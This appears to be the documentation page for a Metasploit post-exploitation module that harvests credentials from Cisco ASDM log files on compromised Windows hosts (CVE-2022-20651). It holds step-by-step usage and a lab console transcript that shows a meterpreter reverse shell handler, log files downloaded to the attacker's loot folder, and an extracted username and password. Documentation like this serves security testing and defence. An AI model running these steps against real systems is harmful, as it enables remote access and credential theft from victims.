## Vulnerable Application

This module uses the PackRat post-exploitation library to find Cisco ASDM log files on
Windows and then parse the files for logged credentials. In some situations, saved usernames
are logged initentionally, but ASDM also logged passwords in some situations
for ASDM 7.17.1 and below (see CVE-2022-20651).

### Setup

## Verification Steps

1. Obtain a privileged meterpreter shell on Windows
2. `background`
3. Run: `use post/windows/gather/credentials/cisco_asdm_logfile`
4. `set SESSION 1`
5. Run the module
6. On success, files will be downloaded and creds will be extracted if they exist.

## Options

## Scenarios

### Capturing credentials (root:labpass1) and username (albinolobster)

```
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.9.49.248
LHOST => 10.9.49.248
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.49.248:4444 
[*] Meterpreter session 1 opened (10.9.49.248:4444 -> 10.9.49.249:62081) at 2022-06-27 09:49:47 -0700

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/gather/credentials/cisco_asdm_logfile
msf6 post(windows/gather/credentials/cisco_asdm_logfile) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/credentials/cisco_asdm_logfile) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Asdm's Asdm-idm-log-*.txt file found
[*] Downloading C:\Users\albinolobster\.asdm\log\asdm-idm-log-2022-06-24-15-30-15.txt
[*] Asdm Asdm-idm-log-2022-06-24-15-30-15.txt downloaded
[+] File saved to:  /home/albinolobster/.msf4/loot/20220627095015_default_10.9.49.249_asdmasdmidmlog_426793.txt

[+] File with data saved:  /home/albinolobster/.msf4/loot/20220627095015_default_10.9.49.249_EXTRACTIONasdmi_452698.txt
[*] Downloading C:\Users\albinolobster\.asdm\log\asdm-idm-log-2022-06-24-15-30-41.txt
[*] Asdm Asdm-idm-log-2022-06-24-15-30-41.txt downloaded
[+] File saved to:  /home/albinolobster/.msf4/loot/20220627095015_default_10.9.49.249_asdmasdmidmlog_825293.txt

[+] Loggedinusername:albinolobster

[+] File with data saved:  /home/albinolobster/.msf4/loot/20220627095019_default_10.9.49.249_EXTRACTIONasdmi_751021.txt
[*] Downloading C:\Users\albinolobster\.asdm\log\asdm-idm-log-2022-06-24-16-53-34.txt
[*] Asdm Asdm-idm-log-2022-06-24-16-53-34.txt downloaded
[+] File saved to:  /home/albinolobster/.msf4/loot/20220627095019_default_10.9.49.249_asdmasdmidmlog_070366.txt

[+] password="labpass1"
[+] username="root"
[+] File with data saved:  /home/albinolobster/.msf4/loot/20220627095019_default_10.9.49.249_EXTRACTIONasdmi_989553.txt
[*] PackRat credential sweep Completed
[*] Post module execution completed
```
